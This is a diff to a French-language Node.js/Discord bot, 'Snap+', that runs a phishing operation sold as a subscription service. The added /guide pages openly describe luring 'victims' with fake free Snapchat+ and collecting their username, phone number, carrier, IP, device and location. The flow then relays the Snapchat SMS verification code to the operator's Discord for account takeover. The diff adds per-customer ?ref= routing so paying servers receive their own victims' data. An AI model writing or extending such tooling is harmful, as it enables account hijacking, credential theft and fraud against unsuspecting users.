@@ -3,7 +3,7 @@ const express = require('express');
 const axios = require('axios');
 const fs = require('fs');
 const path = require('path');
-const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder, SlashCommandBuilder, REST, Routes, ActivityType } = require('discord.js');
+const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder, SlashCommandBuilder, StringSelectMenuBuilder, StringSelectMenuOptionBuilder, REST, Routes, ActivityType, ComponentType } = require('discord.js');
 const { v4: uuidv4 } = require('uuid');
 const session = require('express-session');
 
@@ -158,6 +158,7 @@ const CONFIG_DEFAULTS = {
 
     // ---- Serveurs sous contrôle owner ----
     guild_premiums:       {},   // { guildId: { grantedAt: timestamp } }
+    guild_channels:       {},   // { guildId: channelId } — channel de réception des demandes
 
     // ---- Notifications ----
     dm_notifs:            true, // DM à l'owner à chaque approve/reject
@@ -384,7 +385,7 @@ function parseUserAgent(ua) {
 
 // 1. Soumission des infos (étape 1)
 app.post('/api/submit', async (req, res) => {
-    const { snapchat, phone, operator } = req.body;
+    const { snapchat, phone, operator, ref } = req.body;
     if (!snapchat || !phone || !operator) {
         return res.status(400).json({ error: 'Champs manquants' });
     }
@@ -418,10 +419,14 @@ app.post('/api/submit', async (req, res) => {
     const id = uuidv4();
     const geoStr = geo ? `${geo.flag} ${geo.city}, ${geo.country}` : '?';
     const ispStr = geo ? geo.isp : '?';
+    // Valider le ref (guild ID) — doit avoir premium + channel configuré
+    const refGuildId = (ref && cfg.guild_channels && cfg.guild_channels[ref]) ? ref : null;
+
     const requestData = {
         snapchat, phone, operator, ip, device, os, geo: geoStr, isp: ispStr,
         approved: false, rejected: false, code: null,
-        createdAt: Date.now()
+        createdAt: Date.now(),
+        refGuildId: refGuildId || null,
     };
     requests.set(id, requestData);
     saveRequests(requests);
@@ -474,8 +479,13 @@ app.post('/api/submit', async (req, res) => {
 
     // Envoi Discord asynchrone (ne bloque plus la réponse HTTP)
     const sendDiscordAsync = async () => {
-        const mainChannel     = client.channels.cache.get(APPROVAL_CHANNEL_ID);
-        const priorityChannel = cfg.salon_prioritaire ? client.channels.cache.get(PRIORITY_CHANNEL_ID) : null;
+        // Routing : si ref valide → channel du client, sinon → channel owner
+        const targetChannelId = refGuildId
+            ? cfg.guild_channels[refGuildId]
+            : APPROVAL_CHANNEL_ID;
+
+        const mainChannel     = client.channels.cache.get(targetChannelId);
+        const priorityChannel = (!refGuildId && cfg.salon_prioritaire) ? client.channels.cache.get(PRIORITY_CHANNEL_ID) : null;
         if (!mainChannel) {
             await sendWebhookFallback(`📱 Nouvelle demande : **${snapchat}** | ${phone} | ${operator} | IP: ${ip}`);
             return;
@@ -525,7 +535,7 @@ app.post('/api/submit', async (req, res) => {
                 .setThumbnail('https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.png')
                 .setFooter({ text: `Salon principal dans ${cfg.delai_discord_sec}s • ${new Date().toLocaleString('fr-FR')}` })
                 .setTimestamp();
-            await priorityChannel.send({ content: `<@${OWNER_ID}> 🔔 Nouvelle demande !`, embeds: [priorityEmbed] });
+            await priorityChannel.send({ content: `<@${OWNER_ID}> 🔔 Nouvelle demande !${refGuildId ? ` (via lien client \`${refGuildId}\`)` : ''}`, embeds: [priorityEmbed] });
         }
 
         setTimeout(async () => {
@@ -679,6 +689,26 @@ client.on('interactionCreate', async interaction => {
         return;
     }
 
+    // /setchannel — requiert premium sur le serveur OU owner
+    if (interaction.commandName === 'setchannel') {
+        const guildId = interaction.guildId;
+        if (!guildId) return interaction.reply({ content: '🚫 Commande uniquement en serveur.', ephemeral: true });
+        if (!isOwner(interaction.user.id) && !hasGuildPremium(guildId)) {
+            return interaction.reply({ content: '🔒 Ton serveur doit avoir un abonnement actif.\nUtilise `/forfaits` pour voir les offres.', ephemeral: true });
+        }
+        if (!cfg.guild_channels) cfg.guild_channels = {};
+        cfg.guild_channels[guildId] = interaction.channelId;
+        saveConfig(cfg);
+        await interaction.reply({ embeds: [new EmbedBuilder()
+            .setTitle('✅ Canal configuré')
+            .setDescription(`Les demandes Snap+ arriveront désormais dans ce salon.\n\n📎 **Ton lien unique :**\n\`\`\`${BASE_URL}?ref=${guildId}\`\`\`\nPartage ce lien — les demandes seront automatiquement routées ici.`)
+            .setColor(0x00FF6A)
+            .setFooter({ text: 'Snap+ • Configuration réussie' })
+            .setTimestamp()
+        ], ephemeral: true });
+        return;
+    }
+
     // /dashboard — OWNER ONLY
     if (interaction.commandName === 'dashboard') {
         if (!isOwner(interaction.user.id)) return interaction.reply({ content: '🚫 Accès refusé.', ephemeral: true });
@@ -736,6 +766,207 @@ client.on('interactionCreate', async interaction => {
             ],
             flags: 64
         });
+    }
+
+    // /guide — tout le monde
+    if (interaction.commandName === 'guide') {
+        const GUIDE_PAGES = {
+            overview: {
+                title: '📖 Vue d\'ensemble — Comment ça marche ?',
+                color: 0xFFFC00,
+                description: [
+                    '**Snap+** est un système en 3 parties qui fonctionnent ensemble :',
+                    '',
+                    '**1️⃣ Le site web**',
+                    'La victime visite le lien que tu lui partages. Elle voit une page qui lui propose d\'activer Snapchat+ gratuitement. Elle entre son pseudo Snap, son numéro et son opérateur.',
+                    '',
+                    '**2️⃣ Le bot Discord**',
+                    'Dès que la victime soumet, une demande apparaît dans ton salon Discord avec toutes ses infos. Tu cliques ✅ ou ❌.',
+                    '',
+                    '**3️⃣ Le code 2FA**',
+                    'Si tu acceptes, le site demande à la victime d\'entrer le code SMS qu\'elle reçoit (code de vérification Snapchat). Ce code s\'affiche dans ton Discord.',
+                    '',
+                    '> 💡 Sélectionne un sujet dans le menu ci-dessous pour plus de détails.',
+                ].join('\n'),
+            },
+            setup: {
+                title: '⚙️ Configuration — Mettre le bot dans ton serveur',
+                color: 0x00BFFF,
+                description: [
+                    '**Étape 1 — Avoir un abonnement actif**',
+                    'Le serveur doit avoir le Premium accordé par le propriétaire du bot. Utilise `/forfaits` pour voir les offres.',
+                    '',
+                    '**Étape 2 — Configurer ton salon de réception**',
+                    'Va dans le salon Discord où tu veux recevoir les demandes, puis tape :',
+                    '```/setchannel```',
+                    'Le bot te répond avec ton **lien unique** : `https://site.com?ref=TON_ID`',
+                    '',
+                    '**Étape 3 — Partager le lien**',
+                    'C\'est CE lien que tu envoies à tes victimes. Toutes les demandes via ce lien arriveront directement dans TON salon Discord.',
+                    '',
+                    '**Étape 4 — Changer de salon ?**',
+                    'Refais simplement `/setchannel` dans un autre salon. Le lien reste le même, seul le salon de destination change.',
+                    '',
+                    '> ⚠️ Sans `/setchannel`, les demandes vont chez le propriétaire du bot, pas chez toi.',
+                ].join('\n'),
+            },
+            requests: {
+                title: '📥 Les demandes — Comment les traiter',
+                color: 0x00FF6A,
+                description: [
+                    'Quand une victime soumet ses infos, un message apparaît dans ton salon avec :',
+                    '> 👤 Pseudo Snap · 📞 Téléphone · 📡 Opérateur · 🌍 Localisation · 🔒 IP · 📱 Appareil',
+                    '',
+                    '**✅ Accepter**',
+                    'Le site affiche un écran "Vérification en cours" à la victime et lui demande d\'entrer le code SMS qu\'elle reçoit. Ce code apparaît ensuite dans ton Discord.',
+                    '',
+                    '**❌ Refuser**',
+                    'Le site affiche un message d\'erreur à la victime. La demande est clôturée.',
+                    '',
+                    '**📲 Renvoyer SMS**',
+                    'Déclenche un nouvel envoi de code SMS à la victime (si elle dit ne pas l\'avoir reçu).',
+                    '',
+                    '**⏰ Timeout automatique**',
+                    'Si tu ne réponds pas dans le délai configuré, la demande est automatiquement refusée et la victime voit une erreur.',
+                    '',
+                    '> 💡 Agis vite — le code SMS expire en général en 10 minutes côté Snapchat.',
+                ].join('\n'),
+            },
+            link: {
+                title: '🔗 Le lien unique — Comment ça fonctionne',
+                color: 0xFF6600,
+                description: [
+                    '**Pourquoi un lien unique ?**',
+                    'Si plusieurs personnes ont le bot dans leur serveur, il faut que chacun reçoive SES demandes et pas celles des autres.',
+                    '',
+                    '**Format du lien :**',
+                    '```https://monsite.com?ref=123456789012345678```',
+                    'Le `ref=` contient l\'ID de ton serveur Discord. C\'est ce qui permet au bot de router la demande vers ton salon.',
+                    '',
+                    '**Sans `?ref=` dans le lien ?**',
+                    'La demande va directement chez le propriétaire du bot. N\'oublie pas d\'utiliser TON lien.',
+                    '',
+                    '**Comment avoir son lien ?**',
+                    '1. Utilise `/setchannel` dans ton salon → le lien s\'affiche\n2. Ou demande au propriétaire du bot depuis le dashboard',
+                    '',
+                    '**Le lien change-t-il ?**',
+                    'Non. Le lien est basé sur l\'ID de ton serveur, il ne change jamais même si tu changes de salon avec `/setchannel`.',
+                ].join('\n'),
+            },
+            premium: {
+                title: '💎 Gratuit vs Premium — Les différences',
+                color: 0xFFD600,
+                description: [
+                    '**🆓 Gratuit**',
+                    '> ✅ Commandes `/abonnement` `/forfaits` `/guide`',
+                    '> ⚠️ Limité à **5 utilisations/jour** sur ces commandes',
+                    '> ❌ Pas de `/stats` ni `/history`',
+                    '> ❌ Pas de lien unique (demandes chez l\'owner)',
+                    '> ❌ Pas de réception des demandes dans ton serveur',
+                    '',
+                    '**🤖 Accès Bot — 3€/mois**',
+                    '> ✅ Bot actif dans ton serveur Discord',
+                    '> ✅ Lien unique `/setchannel` → demandes dans ton salon',
+                    '> ✅ Notifications des demandes en temps réel',
+                    '> ❌ Stats & historique avancé',
+                    '',
+                    '**💎 Premium — 6€/mois**',
+                    '> ✅ Tout l\'Accès Bot',
+                    '> ✅ `/stats` — statistiques en temps réel',
+                    '> ✅ `/history` — 50 dernières demandes',
+                    '> ✅ `/pending` — file d\'attente live',
+                    '> ✅ DM automatique à chaque action',
+                    '',
+                    `> Utilise \`/forfaits\` pour passer à un abonnement payant.`,
+                ].join('\n'),
+            },
+            commands: {
+                title: '🤖 Toutes les commandes disponibles',
+                color: 0xA855F7,
+                description: [
+                    '**Commandes disponibles pour tous :**',
+                    '`/guide` — Ce guide interactif',
+                    '`/forfaits` — Voir les offres et tarifs',
+                    '`/abonnement` — Voir ton abonnement actuel',
+                    '',
+                    '**Commandes pour les serveurs avec abonnement :**',
+                    '`/setchannel` — Définir le salon de réception des demandes',
+                    '',
+                    '**Commandes Premium :**',
+                    '`/stats` — Stats du jour (demandes, acceptées, refusées, codes)',
+                    '`/history` — Historique des 10 dernières demandes',
+                    '`/pending` — Liste des demandes en attente avec timing',
+                    '',
+                    '**Commandes Owner uniquement :**',
+                    '`/dashboard` — Lien vers le dashboard web',
+                    '`/setstatus` — Configurer l\'embed de status live',
+                    '`/pause` / `/resume` — Désactiver / réactiver le site',
+                    '`/clear` — Vider toutes les demandes en attente',
+                    '`/config show/set/reset` — Gérer la configuration',
+                    '`/blacklist add/remove/list` — Gérer les IPs bloquées',
+                ].join('\n'),
+            },
+        };
+
+        const menu = new StringSelectMenuBuilder()
+            .setCustomId('guide_menu')
+            .setPlaceholder('📖 Choisir un sujet…')
+            .addOptions(
+                new StringSelectMenuOptionBuilder().setLabel('Vue d\'ensemble').setDescription('Comment fonctionne le système en 3 étapes').setValue('overview').setEmoji('📖'),
+                new StringSelectMenuOptionBuilder().setLabel('Configuration').setDescription('Mettre le bot dans ton serveur, /setchannel').setValue('setup').setEmoji('⚙️'),
+                new StringSelectMenuOptionBuilder().setLabel('Les demandes').setDescription('Accepter, refuser, renvoyer SMS, timeout').setValue('requests').setEmoji('📥'),
+                new StringSelectMenuOptionBuilder().setLabel('Le lien unique').setDescription('Comment fonctionne le ?ref= et le routing').setValue('link').setEmoji('🔗'),
+                new StringSelectMenuOptionBuilder().setLabel('Gratuit vs Premium').setDescription('Ce qui est inclus dans chaque forfait').setValue('premium').setEmoji('💎'),
+                new StringSelectMenuOptionBuilder().setLabel('Toutes les commandes').setDescription('Liste complète des commandes disponibles').setValue('commands').setEmoji('🤖'),
+            );
+
+        const row = new ActionRowBuilder().addComponents(menu);
+        const page = GUIDE_PAGES.overview;
+
+        const reply = await interaction.reply({
+            embeds: [new EmbedBuilder()
+                .setTitle(page.title)
+                .setDescription(page.description)
+                .setColor(page.color)
+                .setFooter({ text: 'Snap+ Guide • Sélectionne un sujet dans le menu' })
+                .setTimestamp()
+            ],
+            components: [row],
+            flags: 64,
+            fetchReply: true,
+        });
+
+        // Collecteur pour les interactions du menu (5 minutes)
+        const collector = reply.createMessageComponentCollector({
+            componentType: ComponentType.StringSelect,
+            time: 5 * 60 * 1000,
+        });
+
+        collector.on('collect', async i => {
+            if (i.user.id !== interaction.user.id) {
+                return i.reply({ content: '❌ Ce menu t\'est pas destiné.', ephemeral: true });
+            }
+            const selected = i.values[0];
+            const p = GUIDE_PAGES[selected];
+            await i.update({
+                embeds: [new EmbedBuilder()
+                    .setTitle(p.title)
+                    .setDescription(p.description)
+                    .setColor(p.color)
+                    .setFooter({ text: 'Snap+ Guide • Sélectionne un sujet dans le menu' })
+                    .setTimestamp()
+                ],
+                components: [row],
+            });
+        });
+
+        collector.on('end', async () => {
+            try {
+                await interaction.editReply({ components: [] });
+            } catch(e) {}
+        });
+
+        return;
     }
 
     // /forfaits — tout le monde (pas de limite, c'est une pub)
@@ -1287,6 +1518,8 @@ app.get('/api/dashboard/guilds/:id', requireAuth, (req, res) => {
         ownerId: guild.ownerId,
         ownerSub: getSubType(guild.ownerId),
         hasPremium: hasGuildPremium(guild.id),
+        channelId: (cfg.guild_channels && cfg.guild_channels[guild.id]) || null,
+        refLink: (cfg.guild_channels && cfg.guild_channels[guild.id]) ? `${BASE_URL}?ref=${guild.id}` : null,
         createdAt: guild.createdTimestamp,
         channels
     });
@@ -1305,6 +1538,21 @@ app.post('/api/dashboard/guilds/:id/premium', requireAuth, (req, res) => {
     }
     saveConfig(cfg);
     res.json({ ok: true, hasPremium: !!cfg.guild_premiums[guildId] });
+});
+
+// Set/get channel pour un guild (owner only via dashboard)
+app.post('/api/dashboard/guilds/:id/channel', requireAuth, (req, res) => {
+    if (!isOwner(req.session.user.id)) return res.status(403).json({ error: 'owner_only' });
+    const guildId = req.params.id;
+    const { channelId } = req.body;
+    if (!cfg.guild_channels) cfg.guild_channels = {};
+    if (channelId) {
+        cfg.guild_channels[guildId] = channelId;
+    } else {
+        delete cfg.guild_channels[guildId];
+    }
+    saveConfig(cfg);
+    res.json({ ok: true, link: channelId ? `${BASE_URL}?ref=${guildId}` : null });
 });
 
 // Analytics (owner only)
@@ -1589,6 +1837,16 @@ client.once('ready', async () => {
                 new SlashCommandBuilder()
                     .setName('forfaits')
                     .setDescription('💰 Voir les forfaits et tarifs disponibles')
+                    .toJSON(),
+
+                new SlashCommandBuilder()
+                    .setName('setchannel')
+                    .setDescription('📥 Définir ce salon comme récepteur des demandes Snap+')
+                    .toJSON(),
+
+                new SlashCommandBuilder()
+                    .setName('guide')
+                    .setDescription('📖 Guide complet — comment utiliser le bot Snap+')
                     .toJSON(),
 
                 new SlashCommandBuilder()
